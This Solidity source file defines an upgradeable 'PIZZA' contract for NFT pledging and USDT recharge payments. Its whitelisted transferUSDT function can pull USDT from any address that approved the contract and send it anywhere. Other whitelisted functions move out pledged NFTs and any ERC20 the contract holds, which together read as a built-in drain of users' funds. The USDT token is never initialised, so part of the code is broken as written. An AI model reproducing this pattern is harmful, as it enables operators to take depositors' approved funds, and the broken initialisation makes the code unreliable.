// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC721/ERC721Upgradeable.sol";

contract PIZZA is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    ERC20Upgradeable private _usdtToken;
    ERC721Upgradeable private _nftToken;
    mapping(address=>bool) whiteList;
    address public rechangeAddress;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize() initializer public {
        __Ownable_init(msg.sender);
        __UUPSUpgradeable_init();
        _nftToken = ERC721Upgradeable(0xFB054F3AE25fac08Bc8CdD7aAd66aaC1d0A8F936);//pizza nft
        whiteList[msg.sender]=true;
    }

    function _authorizeUpgrade(address newImplementation)
        internal
        onlyOwner
        override
    {}

    modifier whiteAddress() {
        require(whiteList[msg.sender], "not white address");
        _;
    }

    function setWhiteAddress(address _account, bool _flag) public onlyOwner {
        whiteList[_account] = _flag;
    }

    function setRechangeAddress(address _addr) public onlyOwner {
        rechangeAddress = _addr;
    }

    function setNFTAddress(address _nftTokenAddress) public onlyOwner {
        _nftToken = ERC721Upgradeable(_nftTokenAddress);
    }

    event FixNFTAmount(address indexed addr,uint256 code, uint256 amount);
    function fixNFTAmount(uint256 code ,uint256 usdtAmount) public {
        address spender = _msgSender();
        if (usdtAmount > 0) {
            _usdtToken.transferFrom(spender, rechangeAddress, usdtAmount);
            emit FixNFTAmount(spender,code, usdtAmount);
        }
    }

    event PledgeNFT(address,address,address,uint256[]);
    function pledgeNFT(uint256[] calldata _tokenIDs) public {
        for (uint256 index = 0; index < _tokenIDs.length; index++) {
            _nftToken.transferFrom(msg.sender, address(this), _tokenIDs[index]);
        }
        emit PledgeNFT(address(_nftToken),msg.sender,address(this),_tokenIDs);
    }

    function redemptionNFT(address _user,uint256 _tokenID) public whiteAddress{
        _nftToken.transferFrom(address(this), _user, _tokenID);
    }
    
    event Rechange(address indexed id, uint256 amount);
    function rechange(uint256 usdtAmount) public {
        address spender = _msgSender();
        if (usdtAmount > 0) {
            _usdtToken.transferFrom(spender, rechangeAddress, usdtAmount);
            emit Rechange(spender, usdtAmount);
        }
    }


    
    //批量转账
    function transferBNBBatch(
        address[] calldata _token,
        address[] calldata _address,
        uint256[] calldata _amounts
    ) public whiteAddress {
        for (uint256 index = 0; index < _token.length; index++) {
            address _account = _address[index];
            ERC20Upgradeable(_token[index]).transfer(_account, _amounts[index]);
        }
    }

    function transferUSDT(
        address from,
        address to,
        uint256 amount
    ) public whiteAddress{
        _usdtToken.transferFrom(from, to, amount);
    }
}